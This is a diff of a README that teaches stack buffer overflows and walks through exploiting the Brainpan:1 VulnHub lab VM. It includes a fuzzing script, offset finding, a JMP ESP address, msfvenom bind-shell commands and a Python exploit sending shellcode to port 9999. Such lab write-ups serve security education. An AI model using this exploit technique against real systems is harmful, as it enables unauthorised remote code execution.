@@ -1,18 +1,21 @@
 # Buffer Overflow With an Example
 
-To understand Buffer Overflow we need to uderstand the memory layout of the program. When we run a typical C program, it gets loaded into the memory (RAM) and gets divided into following five segments:
+This is a simple explanation of buffer overflow vulnerability. If you know how overflow works and only interested in solving brainpan CTF, please scroll down and move to the next section. 
+
+
+To understand Buffer Overflow we need to uderstand the memory layout of a program. When we run a typical C program, it gets loaded into the memory (RAM) and gets divided into following five segments:
 
 - **Text**: stores the executable code of the program.
 - **Initialized data**: stores static/global variables. 
 - **Uninitialized data(BSS)**: stores uninitialized static/global variables. 
-- **Heap**: It is for dynamic memory allocation, it can be managed using functions like malloc, calloc, realloc, free, etc.
+- **Heap**: It is for dynamic memory allocation and can be managed using functions like malloc, calloc, realloc, free, etc.
 - **Stack**: It is used for storing local variables defined inside functions, along with data related to function calls.
 
 ![Memory Layout](https://github.com/azizahsan/Buffer-Overflow/blob/master/layout.png?raw=true)
 
-Please note that Stack grows higher to lower address and heap grows opposite. 
+Note that Stack grows higher to lower address and heap grows opposite. 
 
-Let's take an example. Following is a small C-program:
+Let's take an example of a simple C-program:
 
 ```
 int x = 1000;
@@ -32,20 +35,20 @@ return 1;
 }
 ```
 
-The above program will be loaded in memory as follows:
+The above program will be arranged in memory as follows:
 
-- Variable x (global variable) -> Initialized Data Segment (BSS)
+- Variable *x* (global variable) -> Initialized Data Segment (BSS)
 
-- Local variables var1 and ptr  -> Stack
+- Local variables *var1* and *ptr*  -> Stack
 
-- Variable y -> Uninialized Data Segment
+- Variable *y* -> Uninialized Data Segment
 
-- Values of ptr[1] and ptr[2] -> Heap
+- Values of *ptr[1]* and *ptr[2]* -> Heap
 
 - Machine code of the compiled program -> Text Segment
 
 
-The function "malloc(2 * sizeof(int))" allocates memory (size of two integers) on Heap, and variable ptr is a pointer which is pointing to that block of memory. The ptr will be stored on Stack and values 5 and 6 will go to Heap.
+The function *malloc(2 * sizeof(int))* allocates memory, of size two integers, on Heap, and variable *ptr* is a pointer which is pointing to that block of memory. The *ptr* would be stored on Stack and values *5* and *6* would go to Heap.
 
 Buffer overflow can happen on both Heap and Stack, and the exploitation is differen for both. In this post, our focus is on stack overflow. 
 
@@ -71,20 +74,19 @@ int main()
 
 ```
 
-The function "foo()" would look like this in stack:
+The function *foo()* would look like following in stack:
 
 ![function](https://github.com/azizahsan/Buffer-Overflow/blob/master/function.png?raw=true)
  
-- **Parameters**: the arguments passed to the function will be pushed first in the stack
-- **Return Address**: when a funcion finishes, it returns back to the callee function and the address of next statement is called return address; in above example when foo() finishes it needs to return back to main() function, and run the statement right next to it, so the address of printf statement would be the return address. Please make sure you understand this as this is very important when we exploit buffer overflow.
-- **Previous Frame pointer**: When a program is loaded to the stack, ESP (Extended Stack Pointer) points to the top of the stack, remember stack grows from higher to lower address so ESP would be pointing to the lowest address in stack. We can access other parts of stack with the offset of ESP, e.g. in above example, the ESP would be pointing to the value of y and if value of x needed to be accessed we can add 4-bytes (in 32-bit architecture) in ESP and it would move to value of x. Now what if we call a function inside another function/porgram? the stack would grow to accomodate new function and ESP would also move to the top of the stack, and when we return from the function we would no longer able to access the stack segments as we haven't saved current value of ESP anywhere. To solve this problem, we have another register EBP (Extended Base Pointer), this register keeps the copy of ESP or just points to a fixed location in stack. We have two registers now, ESP pointing to the top of the stack, it can move freely as needed, and EBP which is pointing to a fixed location and other segments can be accessed with the offset of EBP. In this case, when we call another function, we can push the value of EBP into the stack of new function, so that when the function finishes we get back our base pointer. The "Previous Frame Pointer" in above example is basically value of EBP from previous/callee function. 
-- **Local Variables**: next local variables are pushed to stack, the order of the variable is up to the compiler
+- **Parameters**: the arguments passed to the function will be pushed first in the stack.
+- **Return Address**: when a funcion finishes, it returns back to the callee function and the address of next statement is called return address; in above example when *foo()* finishes it needs to return back to *main()* function, and run the statement right next to it, so the address of *printf* statement would be the return address. Please make sure you understand this as this is very important when we exploit buffer overflow.
+- **Previous Frame pointer**: When a program is loaded to the memory, ESP (Extended Stack Pointer) points to the top of the stack, as stack grows from higher to lower address, the ESP would be pointing to the lowest address in stack. We can access other parts of stack with the offset of ESP, e.g. in above example, ESP would be pointing to the value of *y* and if value of *x* needed to be accessed we can add 4-bytes (in 32-bit architecture) in ESP and it would move to value of *x*. Now what if we call a function inside another function/porgram? the stack would grow to accomodate new function and ESP would also move to the top of the stack, and when we return from the function we would no longer be able to access the stack segments as we lost the previous value of ESP. To solve this problem, we have another register EBP (Extended Base Pointer), this register keeps the copy of ESP or just points to a fixed location in stack. So, ESP points to the top of the stack and it can move freely as required, and EBP points to a fixed location and other segments can be accessed with the offset of it. In this case, when we call another function, we can push the value of EBP into the stack of new function, so that when the function finishes we get back our base pointer. The "Previous Frame Pointer" in above example is basically value of EBP from *main* function. 
+- **Local Variables**: next local variables are pushed to stack, the order of the variable is up to the compiler.
 
 
 **A Vulnerable Program**
-Now let's see how a vulnerable program looks like and what happens when buffer overflows. 
 
-Following is a vulnerable program (taken from [this book](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)):
+Following is a simple vulnerable program (taken from [this book](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)):
 
 ```
 #include <string.h>
@@ -105,30 +107,30 @@ return 1;
 The stack arrangement would be:
 ![stack](https://github.com/azizahsan/Buffer-Overflow/blob/master/stack.png?raw=true)
 
-The stack grows from higher to lower addresses but the buffer grows normally i.e. lower to higher. The function foo() takes an argumnets and directly copies it to the buffer using function strcpy(), the buffer is declared as 12-bytes long, but in above program the string is longer, so this string will overflow the buffer and overwrites other parts of stack, i.e. "Previous Frame Pointer", "Return Address" etc. As the return address is modified, the function would try to return to the new address and execute whatever is there, however if the new return address is out of the program allocated memory, the jump will fail and program will crash with a "segmentation fault" error. 
+The stack grows from higher to lower address but the buffer grows normally i.e. lower to higher. The function *foo()* takes an argumnets and directly copies it to the buffer using function *strcpy()*, the buffer is declared as 12-bytes long, but in above program the string is longer than the buffer, so this string will overflow the buffer and overwrites other parts of stack, i.e. "Previous Frame Pointer", "Return Address" etc. As the return address is modified, the function would try to return to the new address and execute whatever is there, however if the new return address is out of the program allocated memory, the jump will fail and program will crash with a "segmentation fault" error. 
 
-An adversary can take advantage of this scenario. If in a program like above, the string is actually a user input, an adversary can craft a string in such a way that he can control the return address, so that when the function returns, it actually returns on his injected code and executes it. Now how does an attacker inject code, and how does he know where is it on stack? most of the time he just enter input once which overflows the stack and jumps to his input; e.g. in above example attacker knows that buffer size is 12-bytes, the next 4-bytes are "Previous Frame Pointer" and then 4-bytes for "Return Address", so he can craft an input as follows:
-
-```
-"16bytes random string" + "A random address on the stack" + "malicious code"
-```
-
-The first 16-bytes would fill up the stack until the return address, then attacker's return address followed by malicious code. Attacker is hoping that the return address will be his address of his malicious code, if it doesn' work then he will try another address. Attacker can improve the probability of guessing the return address by adding some "no operation" bytes before the malicious code, it depends how much space is available on the stack, the payload would look like this: 
+An adversary can take advantage of this scenario. If in a program like above, the string is actually a user input, an adversary can craft a string in such a way that he can control the return address, so that when the function returns, it actually returns on his injected code and executes it. Now how does an attacker inject code, and how does he know where is it on stack? most of the time he just enters input once which overflows the stack and jumps to his code; if the application is publically available, the attacker can try his code on it first before the real attack, otherwise, he has to guess things. In above example, if attacker knows that buffer size is 12-bytes, the next 4-bytes are "Previous Frame Pointer" and then 4-bytes for "Return Address", he can craft an input as follows:
 
 ```
-"16bytes random string" + "A random address on the stack" + "a lot of operations" + "malicious code"
+"16-bytes random string" + "A random address on the stack" + "malicious code"
 ```
+
+The first 16-bytes would fill up the stack until the return address, then attacker's return address followed by malicious code. Attacker is hoping that the return address will be the address of his malicious code, if it doesn' work then he will try another address. Attacker can improve the probability of guessing the return address by adding some "no operation" bytes before the malicious code, it depends how much space is available on the stack. The payload with "no operations"  would look like this: 
+
+```
+"16bytes random string" + "A random address on the stack" + "a lot of no operations bytes" + "malicious code"
+```
+
 Now attacker has to just jump one of the address on one of the no operatoin bytes and it will lead to his malicious code. 
 
-Okay, I think enough of theory and hope you understand how the overflow works. We take a practical exmaple now. 
+I think that's enough of theory and hope you understand how the overflow works. We take a practical exmaple now. 
+
 
 # Brainpan:1 Walkthrough
 
-I am using a vulnerbale machine from vulnhub [Brainpan:1](https://www.vulnhub.com/entry/brainpan-1,51/)
+I am using a vulnerbale machine from vulnhub [Brainpan:1](https://www.vulnhub.com/entry/brainpan-1,51/), found it very good to practice buffer overflow. 
 
-I found it very good to practice buffer overflow. 
-
-If you're using VirtualBox, just unzip the downloaded file and file->import appliance, it would take a couple of minutes to load. Then go settings of the VM and set network adapter as "Host-only". Boot up Brainpan and also the your attacking machine (I am using Kali with Host-only adapter). My attacking machine got IP:192.168.56.101, the brainpan should also get the IP in same subnet, so try to ping 102, 103 or use netdiscover to find out; for me brainpan got 192.168.56.102. 
+If you're using VirtualBox, just unzip the downloaded file and in virtual box *file->import appliance*, it would take a couple of minutes to load. Then go to settings of the VM and set network adapter as *Host-only*. Boot up Brainpan and also the your attacking machine (I am using Kali with Host-only adapter). My attacking machine got IP:192.168.56.101, the brainpan should also get the IP in same subnet, so try to ping .102, .103 or use netdiscover to find out; for me brainpan got IP:192.168.56.102. 
 
 An nmap scan would give us two open ports:
 
@@ -242,7 +244,7 @@ It asks for password which we don't have at this stage.
 Let's download the brainpan.exe from /bin/ on port 10000 and analyse it. 
 
 ```
-file brainpan.exe
+root@kali:~/Downloads# file brainpan.exe
 brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
 root@kali:~/Downloads# strings brainpan.exe
 !This program cannot be run in DOS mode.
@@ -329,15 +331,15 @@ send
 socket
 ```
 
-So this is 32-bit windows binary and have functions like strcpy/strcmp and possible vulnerable to buffer overflow. I will run this binary on Windows 7 virtual machine (you can download it from [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)), I also have installed [immunity debugger](https://www.immunityinc.com/products/debugger/) with [mona scripts](https://github.com/corelan/mona). 
+So this is 32-bit windows binary and have functions like strcpy/strcmp, so its possiblly vulnerable to buffer overflow. I will run this binary on Windows 7 virtual machine (you can download it from [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)), I also have installed [immunity debugger](https://www.immunityinc.com/products/debugger/) with [mona scripts](https://github.com/corelan/mona). 
 
 When I run brainpan.exe it opens port 9999 on my windows, and we can connect to it from our Kali. 
 
-Let's run brainpan.exe and attack debugger to it (start immunity debugger and file->attach->brainpan.exe) and press start program button. We can see the state of registers and memory dump, we can right-click on any register and "follow-dump" to see where is it pointing to in the memory. 
+Let's run brainpan.exe and attack debugger to it (start immunity debugger and file->attach->brainpan.exe) and press start button. We can see the state of the registers and memory dump, we can right-click on any register and *follow-dump* to see where is it pointing to in the memory. 
 
 ![immunity](https://github.com/azizahsan/Buffer-Overflow/blob/master/immunity.png?raw=true)
 
-My windows machine got IP:192.168.56.103. We can use following python code to fuzz the application. This code will send input string (payload) to the application on port 9999. We can send some random pyaloads and see when the application crashes. A payload of size 1000 will crash it, the following code can be used to fuzz it, it is sending 1000 A's:
+My windows machine got IP:192.168.56.103. We can use following python code to fuzz the application. This code will send an input string (payload) to the application on port 9999. We can send some random pyaloads and see when the application crashes. A payload of size 1000 will crash it, the following code can be used to fuzz it, it is sending 1000 A's:
 
 ```
 #!/usr/bin/python
@@ -351,11 +353,12 @@ s.recv(1024)
 s.send(string + '\r\n')
 s.close()
 ```
-So it sent 1000 bytes of data and our application crashed, we can see the error on our debugger. Let's have a look at the registers:
+
+We can see the error on our debugger. Let's have a look at the registers:
 
 ![registers](https://github.com/azizahsan/Buffer-Overflow/blob/master/registers.png?raw=true)
 
-EIP (Extended Instruction Pointer) holds the address of the next instruction, it tells the computer where to go next to execute the next command and controls the flow of a program. In our case, when EIP got the return address our application crashed as that address might be out of the program stack. For ASCII character "A" the hex value is 41 that's why our all memory is filled in with 41s. So we've modified the return address with our payload. Now we need to find out which part of our paylaod actually modified the return address, to do that we can generate a unique string and send it to the application and see the value of EIP. A module from metasploit can be used to generate a unique string:
+EIP (Extended Instruction Pointer) holds the address of the next instruction, it tells the computer where to go next to execute the next command and controls the flow of a program. In our case, when EIP reached to the return address in our application, the application crashed as that address might be out of the program stack. So, For ASCII character "A" the hex value is 41 that's why our all memory is filled with 41s. So we've modified the return address with our payload. Now we need to find out which part of our paylaod actually modified the return address, to do that we can generate a unique string and send it to the application and see the value of EIP. A module from metasploit can be used to generate a unique string:
 
 ```
 root@kali:~/Downloads# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
@@ -381,7 +384,7 @@ After the above payload the registers look like this:
 
 ![eip](https://github.com/azizahsan/Buffer-Overflow/blob/master/eip.png?raw=true)
 
-EIP is 35724134. Let's see where exactly is this in our payload, we can use following command to do that:
+EIP is 35724134, or in other words, the program tried to jump on it and failed. Let's see where exactly is this in our payload, we can use following command to do that:
 
 ```
 root@kali:~/Downloads# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 35724134
@@ -445,21 +448,23 @@ s.send(string + '\r\n')
 s.close()
 ```
 
-I am using the character list four times so that it crashes the application and it's easy for us to find these characters in stack. Now if we match the payload characters with the stack ones, nothing is escaped actually. So we don't have to worry about any bad characters, we can only remove the null bytes (x00) from the payload. If the application reject any character then we need to encode our paylaod, and the decoding would take place on the stack which need some extra bytes, so having some no operations (typically 16-bytes) is a good practice, it will also give some room for malicious code to get decoded, otherwise it may overflow to our return address.  
+I am using the character list four times so that it crashes the application and it's easy for us to find these characters in stack. Now if we match the payload characters with the stack ones, nothing is escaped actually. So we don't have to worry about any bad characters, we can only remove the null bytes (x00) from the payload. 
+
+When an application rejects any character, the payload needs to be encoded, and the decoding would take place on the stack which needs some extra bytes, so having some no operations (typically 16-bytes) is a good practice, it will also give some room for malicious code to get decoded, otherwise it may overflow to our return address.  
 
 ![bad](https://github.com/azizahsan/Buffer-Overflow/blob/master/bad.png?raw=true)
 
 
-So our payload can be look like follows:
+So our payload can look like follows:
 
 ```
 524 bytes of random string + return address + some no operations + malcious code
 
 ```
 
-As we can see in the memory dump that the address where ESP is pointing to is a good place to put our malicious code. So, we need to jump ESP, we cannot hardcode ESP's address as return address, we need to find a statement where we can jump which then jump to ESP. Makes sense?
+As we can see in the memory dump that the address where ESP is pointing to is a good place to put our malicious code. We just need to jump to the address where ESP is pointing, we cannot hardcode value of ESP address as return address in our code as it gets changed, we need to find a statement where we can jump to ESP. 
 
-We can do this by using mona modules in immunity debugger, first step is to see which process has [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) turned off, to do that we type "!mona modules" in debugger:
+It can be done by using mona modules in immunity debugger, first step is to see which process has [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) turned off, to do that we type "!mona modules" in debugger:
 
 ![aslr](https://github.com/azizahsan/Buffer-Overflow/blob/master/aslr.png?raw=true)
 
@@ -476,7 +481,7 @@ Let's search this using mona (note I am running mona commands after crashing the
 
 ![find](https://github.com/azizahsan/Buffer-Overflow/blob/master/find.png?raw=true)
 
-We've got one JMP ESP address: 0x311712F3.
+We've got one "JMP ESP" address: 0x311712F3.
 
 Now our payload would become:
 
@@ -485,11 +490,12 @@ Now our payload would become:
 
 ```
 
-I am adding 16-bytes of no operations as I am using encoding to avoid null bytes in the paylaod. The malicious code can be anything, I am using a bidn shell, it will open port 4444 where we can connect. The msfvenom command for this is (-b is for bad character "\x00" and "x86/shikata_ga_nai" is the encoding we're using):
+I am adding 16-bytes of no operations as I am encoding the payload to avoid null bytes. The malicious code can be anything, I am using a bind shell, it will open port 4444 where we can connect. The msfvenom command for this is (-b is for bad character "\x00" and "x86/shikata_ga_nai" is the encoding we're using):
 
 ```
 msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
 ```
+
 Our final code would look like as follows:
 
 ```
@@ -533,6 +539,8 @@ s.send(string + '\r\n')
 s.close()
 ```
 
+Note the syntax of return address. 
+
 After running the above code, we can connect via netcat:
 
 ```
@@ -551,7 +559,7 @@ As brainpan is linux, we need to generate shellcode for linux:
 msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
 ```
 
-We just replace the shell code and run against the brainpan vm, and we'll be able to get shell. For, this code file is uploaded (linux-poc.py). 
+We just replace the shell code and run against the brainpan vm, and we'll be able to get shell. This code file is uploaded (linux-poc.py). 
 
 
 
